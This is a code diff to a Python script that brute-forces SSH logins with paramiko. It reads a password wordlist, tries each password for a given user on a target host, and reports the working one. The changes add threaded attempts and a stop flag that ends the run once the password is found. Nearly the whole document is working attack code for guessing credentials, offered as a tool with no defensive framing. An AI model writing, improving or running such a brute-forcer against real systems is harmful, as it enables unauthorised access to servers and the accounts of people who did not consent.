@@ -1,11 +1,15 @@
-import paramiko, sys, os, socket, termcolor, argparse
+import paramiko, sys, os, socket, termcolor, argparse, threading, time
+
+stop_flag = 0
 
 
 def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
     """Returns response code (int) 0:success, 1:authError, 2:connectionError"""
+    global stop_flag
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try :
+        termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
         # port 22 is set default in paramiko, declared explicitly for clarity
         ssh_client.connect(hostname=host, port=22, username=username, password=password)
     except paramiko.AuthenticationException:
@@ -15,11 +19,22 @@ def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
         code = 2
         termcolor.cprint(e, "red")
 
+    match code:
+        case 0:
+            stop_flag = 1
+            termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'black', 'on_light_green')
+            # on success break loop, no need to keep trying
+        case 1:
+            termcolor.cprint(f'[-] Credentials {username}:{password} incorrect', 'yellow')
+        case 2:
+            termcolor.cprint((f'[!] Cannot connect to socket', 'red'))
+
     ssh_client.close()
     return code
 
 
 def main(arguments):
+    global stop_flag
     host = arguments.target_ip
     username = arguments.username
     input_file = arguments.path
@@ -30,18 +45,13 @@ def main(arguments):
     else:
         with open(input_file, 'r') as file:
             for line in file.readlines():
+                if stop_flag == 1:
+                    t.join()
+                    exit()
                 password = line.strip("\n")
-                termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
-                response = ssh_connect(username, password, host)
-                match response:
-                    case 0:
-                        termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green')
-                        # on success break loop, no need to keep trying
-                        break
-                    case 1:
-                        termcolor.cprint(f'[-] Credentials {username}:{password} incorrect', 'yellow')
-                    case 2:
-                        termcolor.cprint((f'[!] Cannot connect to socket', 'red'))
+                t = threading.Thread(target=ssh_connect, args=(username, password, host,))
+                t.start()
+                time.sleep(0.5)
 
 
 def get_arguments():
@@ -65,8 +75,8 @@ if __name__ == "__main__":
     try:
         cli_args = get_arguments()
         main(cli_args)
-    except:
-        termcolor.cprint("[!] Something went wrong, exiting...", "red")
+    except :
+        termcolor.cprint(f"[!] Something went wrong, exiting...", "red")
 
 
 
